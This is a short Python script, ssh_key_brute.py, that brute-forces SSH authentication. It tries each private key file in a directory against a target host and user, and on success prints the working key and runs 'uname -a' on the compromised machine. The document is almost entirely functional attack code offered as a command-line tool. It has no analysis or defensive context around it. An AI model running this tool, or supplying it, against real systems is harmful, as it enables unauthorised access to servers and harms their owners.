#! /usr/bin/python

import os, sys, getopt, time;
from pexpect import pxssh;
from threading import *;

stop = False;
maxConn = 3;

def usage():
        print("\n=======================================================================================")
        print("Usage:")
        print("ssh_key_brute.py -t target -u username -k key file directory")
        print("-------------")
        print("-t | --target <target>                  ### target host")
        print("-u | --user <username>                  ### username")
        print("-k | --keys <keys directory>            ### ssh key file directory")
        print("=======================================================================================\n")

def connect(host, user, key):
    global stop;

    ssh=pxssh.pxssh();
   
    try:
        ssh.login(host, user, ssh_key=key)
        print("|+++| Success, Key Found: " + key);
        ssh.sendline('uname -a');
        ssh.prompt();
        print(ssh.before);
        ssh.logout();
        stop = True;
    except pxssh.ExceptionPxssh as e:
        print("|---| Failed");
        print(str(e));


def main(argv):
    
    target = "";
    user = "";
    keys = "";
    key = "";

    if len(argv)<1:
        print("Missing Arguments")
        usage()
        sys.exit(2)
        
    # arg parse block, try to get cli arguments
    try:
        opts, args = getopt.getopt(argv, 'ht:u:k:', ["target=", "user=", "keys="])
    except getopt.GetoptError as err:
        print(err)
        usage()
        sys.exit(2)
                                                                                            
    for opt, arg in opts:
        if opt == '-h':
            usage()
            sys.exit()
        elif opt in ('-t', "--target"):
            target = arg
        elif opt in ('-u', "--user"):
            user = arg
        elif opt in ('-k', "--keys"):
            keys = arg
        else:
            print("what, how did this happen")
    
    for f in os.listdir(keys):
        if stop:
            print("Key Found");
            exit(0);

        key = keys + '/'+ f;
        print("|===| Testing: " + f);
        connect(target, user, key);
        ##time.sleep(2);


if __name__ == "__main__":
    main(sys.argv[1:]);
